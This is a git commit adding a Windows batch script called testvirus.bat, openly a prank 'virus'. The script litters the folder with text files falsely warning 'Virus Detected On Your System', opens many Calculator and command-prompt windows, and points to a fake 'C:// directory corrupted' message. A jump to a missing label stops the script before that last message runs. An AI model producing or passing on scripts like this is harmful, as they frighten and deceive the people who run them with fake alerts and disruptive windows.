f9946a44776635282cf48e2f496b96444bdee6c8
Rosal Haris <90707185+rosalharis@users.noreply.github.com>
2024-10-07 09:32:23 +0700

    Create testvirus.bat

---
+++ testvirus.bat
@@ -0,0 +1,35 @@
+@echo off
+CLS
+:start
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+echo Fatal Error! Virus Detected On Your System > virus%random%.txt
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+goto C
+echo Fatal Error. C:// directory corrupted.
+pause
